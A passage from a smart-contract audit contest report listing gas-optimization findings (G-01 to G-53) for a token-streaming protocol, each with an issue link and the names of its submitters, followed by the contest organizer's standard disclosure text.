cyberboy_\n- [[N-22] Typos](https://github.com/code-423n4/2021-11-streaming-findings/issues/30) _Submitted by wuwe1_\n\n# Gas Optimizations (53)\n- [[G-01] Use inmutable keyword](https://github.com/code-423n4/2021-11-streaming-findings/issues/31) _Submitted by 0x1f8b_\n- [[G-02] Code Style: public functions not used by current contract should be external](https://github.com/code-423n4/2021-11-streaming-findings/issues/260) _Submitted by WatchPug, also found by Jujic, cyberboy, pedroais, robee, and defsec_\n- [[G-03] \"> 0\" is less efficient than \"!= 0\" for unsigned integers](https://github.com/code-423n4/2021-11-streaming-findings/issues/143) _Submitted by ye0lde, also found by 0x0x0x, Jujic, pedroais, and pmerkleplant_\n- [[G-04] No need to check fee inside factories constructor](https://github.com/code-423n4/2021-11-streaming-findings/issues/185) _Submitted by 0x0x0x, also found by csanuragjain_\n- [[G-05] fundStream can be implemented more efficiently](https://github.com/code-423n4/2021-11-streaming-findings/issues/186) _Submitted by 0x0x0x_\n- [[G-06] When exit is called, updateStream is called twice](https://github.com/code-423n4/2021-11-streaming-findings/issues/187) _Submitted by 0x0x0x, also found by WatchPug, kenzo, and pauliax_\n- [[G-07] Directly calculate fee in flash loan](https://github.com/code-423n4/2021-11-streaming-findings/issues/188) _Submitted by 0x0x0x, also found by 0x1f8b, GeekyLumberjack, WatchPug, cmichel, danb, and pauliax_\n- [[G-08] Not needed lastApplicableTime call in claimReward](https://github.com/code-423n4/2021-11-streaming-findings/issues/189) _Submitted by 0x0x0x_\n- [[G-09] In claimReward, reward can be cached more efficiently.](https://github.com/code-423n4/2021-11-streaming-findings/issues/190) _Submitted by 0x0x0x_\n- [[G-10] Use const instead of storage](https://github.com/code-423n4/2021-11-streaming-findings/issues/33) _Submitted by 0x1f8b_\n- [[G-11] Dead code](https://github.com/code-423n4/2021-11-streaming-findings/issues/36) _Submitted by 0x1f8b_\n- [[G-12] Avoid multiple cast](https://github.com/code-423n4/2021-11-streaming-findings/issues/54) _Submitted by 0x1f8b_\n- [[G-13] Remove dead code](https://github.com/code-423n4/2021-11-streaming-findings/issues/57) _Submitted by 0x1f8b_\n- [[G-14] Delete unnecessary variable](https://github.com/code-423n4/2021-11-streaming-findings/issues/58) _Submitted by 0x1f8b_\n- [[G-15] Flashloan is given for 1 token but checks balances for both reward and deposit token](https://github.com/code-423n4/2021-11-streaming-findings/issues/50) _Submitted by pedroais, also found by 0x1f8b_\n- [[G-16] Remove redundant math to save gas in dilutedBalance()](https://github.com/code-423n4/2021-11-streaming-findings/issues/89) _Submitted by GeekyLumberjack_\n- [[G-17] Remove unneeded variable in creatorClaimSoldTokens() to save gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/93) _Submitted by GeekyLumberjack_\n- [[G-18] Struct TokenStream remove unused variable merkleAccess](https://github.com/code-423n4/2021-11-streaming-findings/issues/42) _Submitted by GiveMeTestEther, also found by Jujic and mtz_\n- [[G-19] Cache the return value from rewardPerToken()](https://github.com/code-423n4/2021-11-streaming-findings/issues/44) _Submitted by GiveMeTestEther_\n- [[G-20] Stream constructor reuse the function arguments instead storage variables](https://github.com/code-423n4/2021-11-streaming-findings/issues/45) _Submitted by GiveMeTestEther_\n- [[G-21] Subtraction can be done unchecked because the require statement checks for underflow](https://github.com/code-423n4/2021-11-streaming-findings/issues/46) _Submitted by GiveMeTestEther_\n- [[G-22] Caching variables](https://github.com/code-423n4/2021-11-streaming-findings/issues/104) _Submitted by Jujic_\n- [[G-23] Use one require instead of  several](https://github.com/code-423n4/2021-11-streaming-findings/issues/96) _Submitted by Jujic_\n- [[G-24] [Gas optimization] remove command less else in an if else](https://github.com/code-423n4/2021-11-streaming-findings/issues/137) _Submitted by Omik, also found by gzeon, and pauliax_\n- [[G-25] Use immutable variables can save gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/231) _Submitted by WatchPug, also found by pauliax, pedroais, and robee_\n- [[G-26] Cache and read storage variables from the stack can save gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/232) _Submitted by WatchPug_\n- [[G-27] Remove unnecessary variables can make the code simpler and save some gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/233) _Submitted by WatchPug_\n- [[G-28] Slot packing increases runtime gas consumption due to masking](https://github.com/code-423n4/2021-11-streaming-findings/issues/235) _Submitted by WatchPug_\n- [[G-29] Adding unchecked directive can save gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/238) _Submitted by WatchPug, also found by defsec, hyh, and pauliax_\n- [[G-30] `LockeERC20.sol#toString()` Implementation can be simpler and save some gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/239) _Submitted by WatchPug, also found by 0x0x0x_\n- [[G-31] Avoid unnecessary storage reads can save gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/245) _Submitted by WatchPug_\n- [[G-32] `10**6` can be changed to `1e6` and save some gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/248) _Submitted by WatchPug_\n- [[G-33] Redundant code](https://github.com/code-423n4/2021-11-streaming-findings/issues/250) _Submitted by WatchPug_\n- [[G-34] `Stream#claimReward()` storage writes and reads of `ts.rewards` can be combined into one](https://github.com/code-423n4/2021-11-streaming-findings/issues/259) _Submitted by WatchPug_\n- [[G-35] Avoid unnecessary external calls can save gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/262) _Submitted by WatchPug, also found by gzeon and toastedsteaksandwich_\n- [[G-36] `++currStreamId` is more gas efficient than `currStreamId += 1`](https://github.com/code-423n4/2021-11-streaming-findings/issues/263) _Submitted by WatchPug, also found by cmichel_\n- [[G-37] Remove unnecessary function can make the code simpler and save some gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/265) _Submitted by WatchPug_\n- [[G-38] `arbitraryCall` does not need to check returned byte](https://github.com/code-423n4/2021-11-streaming-findings/issues/168) _Submitted by bitbopper, also found by ye0lde_\n- [[G-39] Gas: `unstreamed` not needed](https://github.com/code-423n4/2021-11-streaming-findings/issues/216) _Submitted by cmichel_\n- [[G-40] Gas: Check `_feePercent` instead](https://github.com/code-423n4/2021-11-streaming-findings/issues/217) _Submitted by cmichel_\n- [[G-52] Structs can be rearranged to save gas](https://github.com/code-423n4/2021-11-streaming-findings/issues/131) _Submitted by cyberboy_\n- [[G-53] Gas Optimization On The 2^256-1](https://github.com/code-423n4/2021-11-streaming-findings/issues/255) _Submitted by defsec_\n- [[G-41] Use local variable in fundStream()](https://github.com/code-423n4/2021-11-streaming-findings/issues/127) _Submitted by gpersoon_\n- [[G-42] Gas Optimization: Move common logic out of if block](https://github.com/code-423n4/2021-11-streaming-findings/issues/181) _Submitted by gzeon_\n- [[G-43] Gas Optimization: Use minimal proxy](https://github.com/code-423n4/2021-11-streaming-findings/issues/183) _Submitted by gzeon_\n- [[G-44] claimReward unnessary logic](https://github.com/code-423n4/2021-11-streaming-findings/issues/119) _Submitted by harleythedog_\n- [[G-45] Stream.updateStreamInternal performs extra storage reads](https://github.com/code-423n4/2021-11-streaming-findings/issues/67) _Submitted by hyh_\n- [[G-46] Stream.claimReward can be simplified](https://github.com/code-423n4/2021-11-streaming-findings/issues/70) _Submitted by hyh_\n- [[G-47] Unnecessary call to lastApplicableTime() in claimReward()](https://github.com/code-423n4/2021-11-streaming-findings/issues/100) _Submitted by kenzo_\n- [[G-48] No need to temporarily save old values when updating settings](https://github.com/code-423n4/2021-11-streaming-findings/issues/99) _Submitted by kenzo_\n- [[G-49] Eliminate amt in fundStream](https://github.com/code-423n4/2021-11-streaming-findings/issues/179) _Submitted by pauliax_\n- [[G-50] Internal functions to private](https://github.com/code-423n4/2021-11-streaming-findings/issues/7) _Submitted by robee_\n- [[G-51] Use existing memory version of state variables (Locke.sol)](https://github.com/code-423n4/2021-11-streaming-findings/issues/142) _Submitted by ye0lde_\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}